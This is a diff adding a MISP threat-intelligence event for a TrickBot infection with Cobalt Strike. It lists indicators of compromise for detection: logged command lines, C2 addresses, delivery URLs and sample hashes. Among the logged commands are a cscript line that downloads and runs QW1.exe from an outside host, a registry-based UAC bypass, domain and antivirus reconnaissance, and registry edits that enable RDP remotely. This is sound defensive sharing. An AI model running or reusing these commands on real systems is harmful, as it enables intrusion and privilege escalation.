@@ -1,0 +1,410 @@
+{
+    "Event":{
+        "threat_level_id":"3",
+        "date":"2020-03-10",
+        "published":true,
+        "info":"Trickbot Gtag QW1",
+        "publish_timestamp":"1593748744",
+        "timestamp":"1621850731",
+        "Tag":[
+            {
+                "name":" Cobalt Strike Beacon"
+            },
+            {
+                "name":"trickbot"
+            },
+            {
+                "name":"Cobalt Strike"
+            },
+            {
+                "name":"misp-galaxy:malpedia=\"TrickBot\""
+            },
+            {
+                "name":"tlp:white"
+            }
+        ],
+        "Attribute":[
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846956",
+                "type":"text",
+                "value":"%WINDIR%\\system32\\cmd.exe /c C:\\DiskDrive\\1\\Volume\\errorfix.bat",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846956",
+                "type":"text",
+                "value":"cscript //nologo C:\\DiskDrive\\1\\Volume\\BackFiles\\pinumber[.]vbs hxxp://customscripts.us/QW1.exe C:\\DiskDrive\\1\\Volume\\BackFiles\\Jofert.exe",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846956",
+                "type":"text",
+                "value":"powershell -C Sleep -s 4;Saps 'C:\\DiskDrive\\1\\Volume\\BackFiles\\Jofert.exe'",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846956",
+                "type":"text",
+                "value":"%WINDIR%\\system32\\cmd[.]exe /C reg add HKEY_CURRENT_USER\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\shell\\open\\command /v \"DelegateExecute\" /t REG_SZ /d \"\" /f",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846956",
+                "type":"text",
+                "value":"%WINDIR%\\system32\\cmd.exe /C reg add HKEY_CURRENT_USER\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\shell\\open\\command /t REG_SZ /d \"%WINDIR%\\system32\\cmd.exe /c start %ALLUSERSPROFILE%\\ì˜ìƒØ«Ø§ÙÙˆØ²Ø¨Øª.exe\" /f",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"reg add HKEY_CURRENT_USER\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\shell\\open\\command /t REG_SZ /d \"%WINDIR%\\system32\\cmd.exe /c start %ALLUSERSPROFILE%\\ì˜ìƒØ«Ø§ÙÙˆØ²Ø¨Øª.exe\" /f",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"reg add HKEY_CURRENT_USER\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\shell\\open\\command /v \"DelegateExecute\" /t REG_SZ /d \"\" /f",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"\"%WINDIR%\\system32\\cmd[.]exe\" /c start %ALLUSERSPROFILE%\\ì˜ìƒØ«Ø§ÙÙˆØ²Ø¨Øª.exe",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"cmd.exe \t/c net config workstation",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"cmd.exe /c ipconfig /all",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"cmd.exe \t/c net view /all",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"cmd.exe \t/c net view /all /domain",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"cmd.exe /c nltest /domain_trusts /all_trusts",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"\"%WINDIR%\\system32\\reg.exe\" add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"%WINDIR%\\system32\\cmd[.]exe /C reg add \"\\\\usha-bdc\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"reg add \"\\\\usha-bdc\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"%WINDIR%\\system32\\cmd.exe /C WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List",
+                "to_ids":true
+            },
+            {
+                "category":"Artifacts dropped",
+                "comment":"",
+                "timestamp":"1583846957",
+                "type":"text",
+                "value":"WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"",
+                "timestamp":"1583849050",
+                "type":"ip-dst",
+                "value":"95.179.210.8",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"",
+                "timestamp":"1583849065",
+                "type":"ip-dst",
+                "value":"50.87.170.67",
+                "to_ids":true
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"",
+                "timestamp":"1583849050",
+                "type":"url",
+                "value":"https://serviceuphelper.com:80/avxbDFb",
+                "to_ids":true
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"",
+                "timestamp":"1583849033",
+                "type":"url",
+                "value":"http://customscripts.us/QW1.exe",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"",
+                "timestamp":"1583849033",
+                "type":"domain",
+                "value":"customscripts.us",
+                "to_ids":true
+            },
+            {
+                "category":"Network activity",
+                "comment":"",
+                "timestamp":"1583849049",
+                "type":"domain",
+                "value":"serviceuphelper.com",
+                "to_ids":true
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"",
+                "timestamp":"1583851022",
+                "type":"url",
+                "value":"http://64.44.133.131/images/cursor.png",
+                "to_ids":true
+            },
+            {
+                "category":"External analysis",
+                "comment":"",
+                "timestamp":"1584443474",
+                "type":"link",
+                "value":"https://laskowski-tech.com/2020/03/16/breakout-time-trickbot-edition/",
+                "to_ids":false
+            }
+        ],
+        "Object":[
+            {
+                "comment":"",
+                "description":"File object describing a file with meta-information",
+                "meta-category":"file",
+                "name":"file",
+                "timestamp":"1583850320",
+                "Attribute":[
+                    {
+                        "category":"Artifacts dropped",
+                        "comment":"",
+                        "timestamp":"1583850320",
+                        "type":"malware-sample",
+                        "value":"Jofert.exe|b17e4833c580bbd343a1834be0e2a65f",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Artifacts dropped",
+                        "comment":"",
+                        "timestamp":"1583850320",
+                        "type":"filename",
+                        "value":"Jofert.exe",
+                        "to_ids":false
+                    },
+                    {
+                        "category":"Artifacts dropped",
+                        "comment":"",
+                        "timestamp":"1583850320",
+                        "type":"md5",
+                        "value":"<md5>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Artifacts dropped",
+                        "comment":"",
+                        "timestamp":"1583850320",
+                        "type":"sha1",
+                        "value":"<sha1>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Artifacts dropped",
+                        "comment":"",
+                        "timestamp":"1583850320",
+                        "type":"sha256",
+                        "value":"<sha256>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1583850320",
+                        "type":"size-in-bytes",
+                        "value":"385024",
+                        "to_ids":false
+                    }
+                ]
+            },
+            {
+                "comment":"",
+                "description":"File object describing a file with meta-information",
+                "meta-category":"file",
+                "name":"file",
+                "timestamp":"1583850335",
+                "Attribute":[
+                    {
+                        "category":"Artifacts dropped",
+                        "comment":"",
+                        "timestamp":"1583850335",
+                        "type":"malware-sample",
+                        "value":"errorfix.bat|4368db27ef2f07171c2c13d2e537d459",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Artifacts dropped",
+                        "comment":"",
+                        "timestamp":"1583850335",
+                        "type":"filename",
+                        "value":"errorfix.bat",
+                        "to_ids":false
+                    },
+                    {
+                        "category":"Artifacts dropped",
+                        "comment":"",
+                        "timestamp":"1583850335",
+                        "type":"md5",
+                        "value":"<md5>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Artifacts dropped",
+                        "comment":"",
+                        "timestamp":"1583850335",
+                        "type":"sha1",
+                        "value":"<sha1>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Artifacts dropped",
+                        "comment":"",
+                        "timestamp":"1583850335",
+                        "type":"sha256",
+                        "value":"<sha256>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1583850335",
+                        "type":"size-in-bytes",
+                        "value":"2864",
+                        "to_ids":false
+                    }
+                ]
+            },
+            {
+                "comment":"",
+                "description":"File object describing a file with meta-information",
+                "meta-category":"file",
+                "name":"file",
+                "timestamp":"1583850410",
+                "Attribute":[
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1583850410",
+                        "type":"malware-sample",
+                        "value":"invoice.doc|d627615f955dd5342ef6b4c6938ad98c",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1583850410",
+                        "type":"filename",
+                        "value":"invoice.doc",
+                        "to_ids":false
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1583850410",
+                        "type":"md5",
+                        "value":"<md5>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1583850410",
+                        "type":"sha1",
+                        "value":"<sha1>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Payload delivery",
+                        "comment":"",
+                        "timestamp":"1583850410",
+                        "type":"sha256",
+                        "value":"<sha256>",
+                        "to_ids":true
+                    },
+                    {
+                        "category":"Other",
+                        "comment":"",
+                        "timestamp":"1583850410",
+                        "type":"size-in-bytes",
+                        "value":"441560",
+                        "to_ids":false
+                    }
+                ]
+            }
+        ]
+    }
+}
